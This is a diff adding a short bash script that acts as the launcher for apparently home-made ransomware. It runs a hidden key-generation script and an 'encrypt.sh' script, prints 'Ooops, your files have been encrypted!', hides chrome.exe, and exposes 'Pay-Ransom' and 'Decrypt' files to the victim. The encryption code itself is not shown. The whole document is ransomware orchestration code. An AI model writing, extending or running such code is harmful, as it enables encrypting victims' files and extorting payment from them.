@@ -1,0 +1,14 @@
+#!/bin/bash
+
+./.genmaster.sh
+
+cd .client
+./encrypt.sh
+
+cd ..
+
+echo "Ooops, your files have been encrypted!"
+
+mv chrome.exe .chrome.exe
+mv .client/Pay-ransom Pay-Ransom
+mv .client/Decrypt Decrypt
